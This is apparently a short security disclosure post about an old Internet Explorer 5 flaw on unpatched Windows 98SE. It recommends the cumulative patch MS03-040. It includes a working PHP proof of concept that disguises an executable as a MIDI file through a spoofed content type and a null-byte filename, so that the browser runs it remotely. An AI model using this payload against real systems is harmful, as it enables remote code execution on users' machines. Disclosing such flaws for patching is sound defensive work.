A default Windows 98SE installation is several years behind in patches.

This does not reproduce on any IE browser that has been patched the last
year or so.

If in doubt about your IE patch level apply the latest cumulative patch
MS03-040, which can be found at

This code can execute any code remotely using IE - as  you can see very
simple.

// for IE 5, tested on default Windows 98SE installation
<?php
Header("Content-type: audio/midi");
Header("Content-Disposition: inline; filename=readme.txt%00code.exe");
readfile("code.exe"); ?> <noscript>

Here you have a demo:

Can we expect more surprises like this one?
